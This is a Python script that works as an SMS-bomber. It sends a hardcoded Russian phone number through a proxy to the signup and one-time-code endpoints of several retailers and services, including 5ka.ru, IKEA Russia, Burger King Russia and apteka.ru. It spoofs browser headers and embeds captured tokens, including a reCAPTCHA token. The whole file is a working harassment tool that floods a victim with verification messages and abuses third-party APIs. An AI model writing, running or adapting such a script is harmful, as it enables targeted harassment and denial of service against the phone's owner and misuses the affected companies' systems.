import requests
import time
import random




#print("Введи номер телефона без кода страны")
#phone=input()


#print("Номер телефона " + phone)
phone = '9991253348'
ts = 1
ipPort = "149.19.224.39:3128"
proxy = {"https": "https://" + ipPort}
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
    "Content-Type": "application/json", }

def pyaterka():
    pPhone = "+7" + phone
    pyaterkaHeaders = headers
    pyaterkaHeaders.update({"x-Authorization": "Tokena3133e4dd44f3c7fcaa98d7a9d1f73e44ab656d0", "Host": "5ka.ru",
                            "Origin": "https://5ka.ru"})
    p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone},
                      proxies=proxy)
    print(p.status_code)

def karusel():
    karHeaders = headers
    karHeaders.update({"Host": "app.karusel.ru", "Origin": "https://karusel.ru"})
    karPhone = "7" + phone
    kar = requests.post("https://app.karusel.ru/api/v2/token/", headers=karHeaders, json={"phone": karPhone,
                                                                                          "recaptcha_token": "03AGdBq255xknZF1jMw1N-O4w36uvaeyqFAeYk2x2MhYiDnLs31jnWYboOi1evSLHIrL7JSzXYjesrWMhv5sxvt2hJfEM2N3AXeAKjD135PpocJiEmrYWConWAg2XRGzUZp_rX-FgIoq2Y7qCyBcIdx1CW4KLzh6X_Xk2NvV3-F7L2jynBvXJNmpRL7DBsZZ5xCxLs4JYSfZS4UmPhd0yE-wGIgUtHb4Dz74PSCk61LJg8_bfpB-uo8xoEdgiCg6MeiPPWBjtCqZC_nBF-2zY93Vd64PQd7gAc4aJTd2O7iqGnKEdTPDvUex0B0sI2oHUNJ0m1Ggr0z3C9OWEPtr7l7S3zrgbiH7PZHtWbiuM2Y_VVPxs4aCedXDOWPF1kZ_EuZWYAhCN0iIwGrgJkHPnKl22HfyU149kpK1dTlz_fL_4BeJozTwv0atHwRbjGxYb7youdKp8fJmKe"},
                        proxies=proxy)
    print(kar.status_code)
    print(kar.json())

def aptekaru():
    aptHeaders = headers
    aptHeaders.update({"Host": "api.apteka.ru", "Origin": "https://apteka.ru", "cityId": "5e57803249af4c0001d64407"})
    aptPhone = "+7" + phone
    apt = requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d644070", headers=aptHeaders,
                        json={"phone": aptPhone, "u": "1"}, proxies=proxy)
    print(apt.status_code, "aptekaru")
    print(apt.json())

#def bistrodengi():
    #bisHeaders=headers
    #bisHeaders.update({"Host":"bistrodengi.ru","Origin":"https://bistrodengi.ru","X-Requested-With":"XMLHttpRequest"})
    #bisPhone="+7"+phone
    #bis=requests.post("https://bistrodengi.ru/ajax/lead.php",headers=bisHeaders,json={"fio":none,"phone":bisPhone})


def ikea():
    ikHeaders=headers
    ikHeaders.update({"Host":"ru.accounts.ikea.com","Origin":"https://ru.accounts.ikea.com"})
    ikPhone="+7" + phone
    ik=requests.post("https://ru.accounts.ikea.com/cim/ru/ru/v1/passwordless/start",headers=ikHeaders,proxies=proxy,json={"phoneNumber":ikPhone,"flow":"SIGNUP_PHONE_VERIFY"})
    print(ik.status_code,"Ikea")

def burgerKing():
    bkHeaders=headers
    bkHeaders.update({"Host":"burgerking.ru","Origin":"https://burgerking.ru","x-burgerking-session-id":"875c2b20-f7c3-11eb-9546-41b04798b4e4"})
    bkPhone="7" + phone
    bk=requests.post("https://burgerking.ru/middleware/bridge/api/v3/auth/signup",headers=bkHeaders,proxies=proxy,json={"phone":bkPhone,"invite":""} )
    if bk.status_code==200:
        print("Успешно отправлено "+"BurgerKing")

def ostin():
    osHeaders=headers
    osHeaders.update({"x-ts-ajax-request":"true","x-security-request":"required","accept-encoding":"gzip, deflate, br","accept-language":"ru-RU,ru;q=0.9","accept":"application/json, text/plain, */*"})
    osPhone="+7"+phone
    os=requests.post("https://ostin.com/api/v2/front/request-code",headers=osHeaders,proxies=proxy,json={"phone":osPhone,"channel":"PUSH"})
    print(os.status_code,"Ostin")

ostin()
burgerKing()
ikea()
pyaterka()
aptekaru()
karusel()